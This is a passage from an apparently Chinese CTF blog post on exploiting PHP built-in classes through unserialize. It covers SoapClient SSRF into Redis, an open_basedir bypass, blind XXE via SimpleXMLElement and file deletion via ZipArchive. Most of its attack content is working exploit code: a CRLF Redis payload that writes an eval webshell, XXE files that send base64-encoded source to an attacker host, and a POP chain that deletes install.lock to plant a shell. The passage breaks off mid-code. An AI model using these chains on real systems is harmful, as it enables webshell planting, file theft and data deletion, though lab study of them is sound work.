<p>可以看到，该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
<p>该类的构造函数如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</span><br></pre></td></tr></tbody></table></figure>

<ul>
<li>第一个参数是用来指明是否是 wsdl 模式，将该值设为 null 则表示非 wsdl 模式。</li>
<li>第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP 服务的目标命名空间。</li>
</ul>
<p>成功的前提需要先把 php.ini 开启 <code>extension=soup</code></p>
<h2 id="SoapClient-ssrf"><a href="#SoapClient-ssrf" class="headerlink" title="SoapClient+ssrf"></a>SoapClient+ssrf</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">//hint: Redis20251206</span><br><span class="line"></span><br><span class="line">class pure{</span><br><span class="line">    public $web;</span><br><span class="line">    public $misc;</span><br><span class="line">    public $crypto;</span><br><span class="line">    public $pwn;</span><br><span class="line"></span><br><span class="line">    public function __construct($web, $misc, $crypto, $pwn){</span><br><span class="line">        $this-&gt;web = $web;</span><br><span class="line">        $this-&gt;misc = $misc;</span><br><span class="line">        $this-&gt;crypto = $crypto;</span><br><span class="line">        $this-&gt;pwn = $pwn;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function reverse(){</span><br><span class="line">        $this-&gt;pwn = new $this-&gt;web($this-&gt;misc, $this-&gt;crypto);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function osint(){</span><br><span class="line">        $this-&gt;pwn-&gt;play_0xGame();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function __destruct(){</span><br><span class="line">        $this-&gt;reverse();</span><br><span class="line">        $this-&gt;osint();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$AI = $_GET['ai'];</span><br><span class="line"></span><br><span class="line">$ctf = unserialize($AI);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/ab758827/1761881367458-9cde0542-c1d3-4c28-b75c-6a9db698f6bb.png" alt="img"></p>
<p>这里会调用未知方法，所以可以调用到魔术方法call（这里会想到soapclient类的call方法），在结合提示redis和20251206（密码），这就是ssrf+redis。</p>
<p>主要利用请求头进行攻击（CLRF）</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class pure {</span><br><span class="line">    public $web;</span><br><span class="line">    public $misc;</span><br><span class="line">    public $crypto;</span><br><span class="line">    public $pwn;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$a = new pure();</span><br><span class="line">$a-&gt;web = 'SoapClient';</span><br><span class="line">$a-&gt;misc = null;</span><br><span class="line">$target = 'http://127.0.0.1:6379/';</span><br><span class="line">$poc = "AUTH 20251206\r\nCONFIG SET dir /var/www/html/\r\nCONFIG SET dbfilename shell.php\r\nSET x '&lt;?= @eval(\$_POST[1]) ?&gt;'\r\nSAVE";</span><br><span class="line">$a-&gt;crypto = array('location' =&gt; $target, 'uri' =&gt; "hello\"\r\n" . $poc . "\r\nhello");</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></tbody></table></figure>

<ul>
<li><code>\r\n</code> 是HTTP协议中的换行符</li>
<li>通过注入换行符，将Redis命令作为HTTP头部注入</li>
<li>Redis会将这些命令解析并执行</li>
</ul>
<p>传入shell，连接蚁剑得到flag</p>
<p><img src="/posts/ab758827/1761882045840-58b2025b-9ed5-4cc2-b4d6-925543bb78da.png" alt="img"></p>
<h1 id="使用Directorylterator类绕过open-basedir"><a href="#使用Directorylterator类绕过open-basedir" class="headerlink" title="使用Directorylterator类绕过open_basedir"></a>使用Directorylterator类绕过open_basedir</h1><p>DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类。翻译过来就是文件枚举迭代器。</p>
<p>Directorylterator与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件</p>
<p>测试源码：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// test.php</span><br><span class="line">&lt;?php</span><br><span class="line">$dir = $_GET['whoami'];</span><br><span class="line">$a = new DirectoryIterator($dir);</span><br><span class="line">foreach($a as $f){</span><br><span class="line">    echo($f-&gt;__toString().'&lt;br&gt;');</span><br><span class="line">}</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"># payload一句话的形式:</span><br><span class="line">$a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f-&gt;__toString().'&lt;br&gt;');}</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/ab758827/1765887212161-1bc0921c-0e86-41cc-ac0c-1bf7ccb544ce.png" alt="img"></p>
<p>这边可以直接列取根目录</p>
<p><img src="/posts/ab758827/1765887201330-bfb3b7c6-a8b4-4bc9-ac6d-6f07e93fe275.png" alt="img"></p>
<p>但是不能进行文件读取</p>
<p>同样效果的还有 FilesystemIterator 类与 GlobIterator 类</p>
<h1 id="使用-SimpleXMLElement-类进行-XXE"><a href="#使用-SimpleXMLElement-类进行-XXE" class="headerlink" title="使用 SimpleXMLElement 类进行 XXE"></a>使用 SimpleXMLElement 类进行 XXE</h1><p>官方文档中对于 SimpleXMLElement 类的构造方法 <code>SimpleXMLElement::__construct</code> 的定义如下：</p>
<p><img src="/posts/ab758827/1765887628525-9eb91ea3-0ae9-4f39-b72d-24ceec5bee6e.png" alt="img"></p>
<p><img src="/posts/ab758827/1765887646912-643d4380-0a8a-490d-997f-69d990692bcc.png" alt="img"></p>
<p>可以看到通过设置第三个参数 data_is_url 为 <code>true</code>，我们可以实现远程 xml 文件的载入。第二个参数的常量值我们设置为 <code>2</code> 即可。第一个参数 data 就是我们自己设置的 payload 的 url 地址，即用于引入的外部实体的 url。</p>
<p>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p>
<h2 id="SUCTF-2018-Homework"><a href="#SUCTF-2018-Homework" class="headerlink" title="[SUCTF 2018]Homework"></a>[SUCTF 2018]Homework</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class calc{</span><br><span class="line">	function __construct__(){</span><br><span class="line">		calc();</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	function calc($args1,$method,$args2){</span><br><span class="line">		$args1=intval($args1);</span><br><span class="line">		$args2=intval($args2);</span><br><span class="line">		switch ($method) {</span><br><span class="line">			case 'a':</span><br><span class="line">				$method="+";</span><br><span class="line">				break;</span><br><span class="line"></span><br><span class="line">			case 'b':</span><br><span class="line">				$method="-";</span><br><span class="line">				break;</span><br><span class="line"></span><br><span class="line">			case 'c':</span><br><span class="line">				$method="*";</span><br><span class="line">				break;</span><br><span class="line"></span><br><span class="line">			case 'd':</span><br><span class="line">				$method="/";</span><br><span class="line">				break;</span><br><span class="line">			</span><br><span class="line">			default:</span><br><span class="line">				die("invalid input");</span><br><span class="line">		}</span><br><span class="line">		$Expression=$args1.$method.$args2;</span><br><span class="line">		eval("\$r=$Expression;");</span><br><span class="line">		die("Calculation results:".$r);</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line">?&gt;		</span><br></pre></td></tr></tbody></table></figure>

<p>登录进来有一个源码，但是没有什么可以利用的点</p>
<p><img src="/posts/ab758827/1765889268089-5604e837-7cad-4d00-9017-eaaf595a8410.png" alt="img"></p>
<p>我们来看一下这里</p>
<p>出现了module这里是对类名的调用，后面是参数，这样可以使用simpleXmlElement来打一个无回显的xxe</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://d40c479f-f84a-495e-a09a-3ac1d2184c9d.node5.buuoj.cn:81/show.php?module=SimpleXMLElement&amp;args[]=http://ip/evil.xml&amp;args[]=2&amp;args[]=true</span><br></pre></td></tr></tbody></table></figure>

<p>evil.xml</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % remote SYSTEM "http:/ip/send.xml"&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>send.xml</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"&gt;</span><br><span class="line">&lt;!ENTITY % all "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://ip/send.php?file=%file;'&gt;"&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>send.php</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">file_put_contents("result.txt", $_GET['file']) ;</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>不知道是我的原因还是buu的原因，这里的源码带不出来但是这个思路肯定是能用的</p>
<h1 id="使用-ZipArchive-类来删除文件"><a href="#使用-ZipArchive-类来删除文件" class="headerlink" title="使用 ZipArchive 类来删除文件"></a>使用 ZipArchive 类来删除文件</h1><p>PHP ZipArchive 类是 PHP 的一个原生类，它是在 PHP 5.2.0 之后引入的。ZipArchive 类可以对文件进行压缩与解压缩处理。</p>
<p>下面列举几个常见的类方法：</p>
<ul>
<li><code>ZipArchive::addEmptyDir</code>：添加一个新的文件目录</li>
<li><code>ZipArchive::addFile</code>：将文件添加到指定zip压缩包中</li>
<li><code>ZipArchive::addFromString</code>：添加新的文件同时将内容添加进去</li>
<li><code>ZipArchive::close</code>：关闭 ZipArchive</li>
<li><code>ZipArchive::extractTo</code>：将压缩包解压</li>
<li><code>ZipArchive::open</code>：打开一个zip压缩包</li>
<li><code>ZipArchive::deleteIndex</code>：删除压缩包中的某一个文件，如：<code>deleteIndex(0)</code> 代表删除第一个文件</li>
<li><code>ZipArchive::deleteName</code>：删除压缩包中的某一个文件名称，同时也将文件删除</li>
<li>……</li>
</ul>
<p>我们来重点看看 <code>ZipArchive::open</code> 方法：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZipArchive::open ( string $filename [, int $flags ] ) : mixed</span><br></pre></td></tr></tbody></table></figure>

<p>该方法用来打开一个新的或现有的 zip 存档以进行读取，写入或修改。</p>
<ul>
<li><code>$filename</code>：要打开的 ZIP 存档的文件名。</li>
<li><code>$flags</code>：用于打开档案的模式。有以下几种模式：</li>
<li><code>ZipArchive::OVERWRITE</code>：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。</li>
<li><code>ZipArchive::CREATE</code>：如果不存在则创建一个 zip 压缩包。</li>
<li><code>ZipArchive::RDONLY</code>：只读模式打开压缩包。</li>
<li><code>ZipArchive::EXCL</code>：如果压缩包已经存在，则出错。</li>
<li><code>ZipArchive::CHECKCONS</code>：对压缩包执行额外的一致性检查，如果失败则显示错误。</li>
</ul>
<p>注意，如果设置 flags 参数的值为 <code>ZipArchive::OVERWRITE</code> 的话，可以把指定文件删除。这里我们跟进方法可以看到 <code>const OVERWRITE = 8</code>，也就是将 OVERWRITE 定义为了常量8，我们在调用时也可以直接将 <code>$flags</code> 赋值为8。</p>
<p>也就是说我们可以利用 ZipArchive 原生类调用 open 方法删除目标主机上的文件。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a = new ZipArchive();</span><br><span class="line">$a-&gt;open('1.txt',ZipArchive::OVERWRITE);  </span><br><span class="line">// ZipArchive::OVERWRITE:  总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖</span><br><span class="line">// 因为没有保存，所以效果就是删除了1.txt</span><br></pre></td></tr></tbody></table></figure>

<h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>题目是铸剑杯的，源码还是存着的</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class install {</span><br><span class="line">    private $username;</span><br><span class="line">    private $password;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    {</span><br><span class="line">        echo "Hello,".$this-&gt;username;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    {</span><br><span class="line">        ($this-&gt;username)();</span><br><span class="line">        return "Guest";</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    {</span><br><span class="line">        if(file_exists("install.lock")){</span><br><span class="line">            exit("Already installed");</span><br><span class="line">        }else{</span><br><span class="line">            $config = [</span><br><span class="line">                'username' =&gt; $this-&gt;username,</span><br><span class="line">                'password' =&gt; md5($this-&gt;password)</span><br><span class="line">            ];</span><br><span class="line">            file_put_contents('config.php', serialize($config));</span><br><span class="line">            file_put_contents('install.lock', "ok");</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">class Until {</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public $c;</span><br><span class="line"></span><br><span class="line">    public function __invoke()</span><br><span class="line">    {</span><br><span class="line">        $this-&gt;write($this-&gt;a, $this-&gt;b, $this-&gt;c);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    {</span><br><span class="line">        return "HappyUnserialize";</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function write($cla, $file, $cont)</span><br><span class="line">    {</span><br><span class="line">        $obj = new $cla();</span><br><span class="line">        $obj-&gt;open($file,$cont);</span><br><span class="line">        return True;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">@unserialize($_GET['data']);</span><br></pre></td></tr></tbody></table></figure>

<p>exp</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class install {</span><br><span class="line">    private $username;</span><br><span class="line">    private $password;</span><br><span class="line"></span><br><span class="line">    public function __construct($username, $password)</span><br><span class="line">    {</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">class Until {</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public $c;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$c = new Until();</span><br><span class="line">$c-&gt;a = 'ZipArchive';</span><br><span class="line">$c-&gt;b = 'install.lock';</span><br><span class="line">$c-&gt;c = 8;</span><br><span class="line">$c-&gt;d = "&lt;?php @eval(\$_POST[1]);?&gt;";</span><br><span class="line">$b = new install($c,123);</span><br><span class="line">$a = new install($b,123);</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></tbody></table></figure>

<h1 id="使用SplFileObject来进行文件内容读取"><a href="#使用SplFileObject来进行文件内容读取" class="headerlink" title="使用SplFileObject来进行文件内容读取"></a>使用SplFileObject来进行文件内容读取</h1><p>SplFileObject 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.splfileobject.php">https://www.php.net/manual/zh/class.splfileobject.php</a></p>
<p>该类的构造方法可以构造一个新的文件对象用于后续的读取。</p>
<p>我们可以像类似下面这样去读取一个文件的一行：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$content = new SplFileObject('1.txt');</span><br><span class="line">echo $content;</span><br></pre></td></tr></tbody></table></figure>

<p>只能读取一行</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$content = new SplFileObject('1.txt');</span><br><span class="line">foreach ($content as $line) {</span><br><span class="line">    echo $line ;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/ab758827/1765893535284-2e398325-5e11-47c5-93cd-2fd5d23ef92a.png" alt="img"></p>
<p>读取多行</p>
<h2 id="GHCTF-2025-Popppppp"><a href="#GHCTF-2025-Popppppp" class="headerlink" title="[GHCTF 2025]Popppppp"></a>[GHCTF 2025]Popppppp</h2><p>exp</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class CherryBlossom {</span><br><span class="line">    public $fruit1;</span><br><span class="line">    public $fruit2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function __destruct() {</span><br><span class="line">        echo $this-&gt;fruit1;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public function __toString() {</span><br><span class="line">        $newFunc = $this-&gt;fruit2;</span><br><span class="line">        return $newFunc();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Philosopher {</span><br><span class="line">    public $fruit10;</span><br><span class="line">    public $fruit11="M7O3sikpATKW9t1AiqA4";</span><br><span class="line"></span><br><span class="line">    public function __invoke() {</span><br><span class="line">        if (md5(md5($this-&gt;fruit11)) == 666) {</span><br><span class="line">            return $this-&gt;fruit10-&gt;hey;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">class Mystery {</span><br><span class="line"></span><br><span class="line">    public $GlobIterator="/*"；</span><br><span class="line">    public function __get($arg1) {</span><br><span class="line">        array_walk($this, function ($day1, $day2) {</span><br><span class="line">            $day3 = new $day2($day1);</span><br><span class="line">            foreach ($day3 as $day4) {</span><br><span class="line">                echo ($day4 . '&lt;br&gt;');</span><br><span class="line">            }</span><br><span class="line">        });</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$x=new CherryBlossom();</span><br><span class="line">$x-&gt;fruit1 = new CherryBlossom();</span><br><span class="line">$x-&gt;fruit1-&gt;fruit2 = new Philosopher();</span><br><span class="line">$x-&gt;fruit1-&gt;fruit2-&gt;fruit10 = new Mystery();</span><br><span class="line"></span><br><span class="line">print_r(serialize($x));</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/ab758827/1741603442808-7a3cb1bf-4ef8-4722-b615-3d3da2f4e495.png" alt="img"></p>
<p>将其实例化一个对象array_walk遍历数组，并赋值day1为值，day2为键</p>
<p>day3 将其实例化 day3=new GlobTterator（/*）</p>
<p><img src="/posts/ab758827/1741604014980-63acd2a0-bd50-44fe-b4b2-23b51c2bbe4e.png" alt="img"></p>
<p>列出目录</p>
<p><img src="/posts/ab758827/1741604107215-8ef07610-26d0-421a-a09a-45466201c291.png" alt="img"></p>
<p>读取内容</p>
<p>有关php原生类的调用，反序列化时可连续调用同一个类（更简便）</p>
<p><img src="/posts/ab758827/1741524481002-0e0095a0-b557-4034-af4a-f28d1b972079.png" alt="img"></p>
<p>更改Mystery类的属性</p>
<p><img src="/posts/ab758827/1741524514610-de90761e-3e28-4867-b69b-671461da978c.png" alt="img"></p>
<p>拿到flag</p>
<p>双重碰撞md5的脚本</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import multiprocessing</span><br><span class="line">import hashlib</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">CHARS = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line">def cmp_md5(substr, stop_event, str_len, start=0, size=20):</span><br><span class="line">    global CHARS</span><br><span class="line">    while not stop_event.is_set():</span><br><span class="line">        rnds = ''.join(random.choice(CHARS) for _ in range(size))</span><br><span class="line">        md5 = hashlib.md5(rnds)</span><br><span class="line">        value = md5.hexdigest()</span><br><span class="line">        if value[start: start + str_len] == substr:</span><br><span class="line">            # print rnds</span><br><span class="line">            # stop_event.set()</span><br><span class="line"></span><br><span class="line">            # 碰撞双md5</span><br><span class="line">            md5 = hashlib.md5(value)</span><br><span class="line">            if md5.hexdigest()[start: start + str_len] == substr:</span><br><span class="line">                print (rnds + "=&gt;" + value + "=&gt;" + md5.hexdigest() + "\n")</span><br><span class="line">                stop_event.set()</span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    substr = sys.argv[1].strip()</span><br><span class="line">    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0</span><br><span class="line">    str_len = len(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                                               stop_event,</span><br><span class="line">str_len, start_pos))</span><br><span class="line">                for i in range(cpus)]</span><br><span class="line">    for p in processes:</span><br><span class="line">        p.start()</span><br><span class="line">    for p in processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></tbody></table></figure>

<p>#python2 md5.py “666” 0 </p>
<h1 id="反射类Reflection"><a href="#反射类Reflection" class="headerlink" title="反射类Reflection"></a>反射类Reflection</h1><p>大体上和 Java 的反射也是一样的</p>
<p>ReflectionMethod 类报告了一个方法的有关信息。ReflectionMethod 类中有很多继承方法可以使用，比如这个 <code>getDocComment()</code> 方法，我们可以用它来获取类中各个函数注释内容</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FlagIsHere</span><br><span class="line">{</span><br><span class="line">    /**</span><br><span class="line">     * 这是测试方法</span><br><span class="line">     * flag{success}</span><br><span class="line">     * @return int</span><br><span class="line">     */</span><br><span class="line">    protected function GiveMeFlag()</span><br><span class="line">    {</span><br><span class="line">        return 9999;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$ref = new 